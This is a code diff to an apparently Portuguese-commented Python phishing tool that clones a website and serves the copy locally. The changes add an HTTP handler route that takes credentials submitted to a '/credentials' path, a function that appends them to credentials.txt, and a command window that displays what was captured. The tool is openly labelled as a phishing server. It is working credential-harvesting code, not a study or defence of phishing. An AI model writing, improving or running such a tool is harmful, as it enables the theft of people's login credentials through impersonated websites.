@@ -275,7 +275,7 @@ def clone_website(url, server_choice, language):
 
             # Continuar com a execução no servidor selecionado (apenas localhost implementado)
             if server_choice == '1':
-                run_local_server(language)
+                run_local_server(url, language)
 
         else:
             print(f"Failed to clone {url}. Status code: {response.status_code}")
@@ -284,7 +284,7 @@ def clone_website(url, server_choice, language):
         print(f"Error cloning website: {e}")
 
 # Função para executar o servidor local
-def run_local_server(language):
+def run_local_server(url, language):
     clear_console()
     if language == '1':
         print("Running phishing site on localhost...")
@@ -293,8 +293,26 @@ def run_local_server(language):
 
     # Configurar o servidor HTTP local para servir os arquivos clonados
     class PhishingServer(http.server.SimpleHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos
+        def do_GET(self):
+            # Rota para a página clonada
+            if self.path == '/index.html':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                with open('index.html', 'rb') as f:
+                    self.wfile.write(f.read())
+            # Rota para receber as credenciais
+            elif self.path.startswith('/credentials'):
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                # Extrair as credenciais da URL
+                credentials = self.path.split('/')[-1]
+                # Salvar as credenciais em um arquivo de texto
+                save_credentials(credentials)
+                self.wfile.write(b'Credentials captured!')
+            else:
+                super().do_GET()
 
     try:
         # Iniciar o servidor em uma thread separada
@@ -303,7 +321,11 @@ def run_local_server(language):
         server_thread.daemon = True
         server_thread.start()
 
-        print("Server running at http://localhost:8080")
+        print(f"Server running at http://localhost:8080/index.html (phishing page)")
+
+        # Abrir uma nova janela CMD para mostrar as credenciais capturadas
+        subprocess.Popen(["start", "cmd", "/k", f"echo Credenciais capturadas: && type credentials.txt"])
+
         input("\nPress Enter to stop the phishing server and continue...")
 
         # Após capturar as credenciais, parar o servidor
@@ -315,6 +337,15 @@ def run_local_server(language):
 
     except Exception as e:
         print(f"Error running local server: {e}")
+
+# Função para salvar as credenciais em um arquivo de texto
+def save_credentials(credentials):
+    try:
+        with open('credentials.txt', 'a', encoding='utf-8') as file:
+            file.write(credentials + '\n')
+        print("Credentials saved successfully!")
+    except Exception as e:
+        print(f"Error saving credentials: {e}")
 
 # Função para limpar os arquivos HTML e CSS
 def clean_up_files():
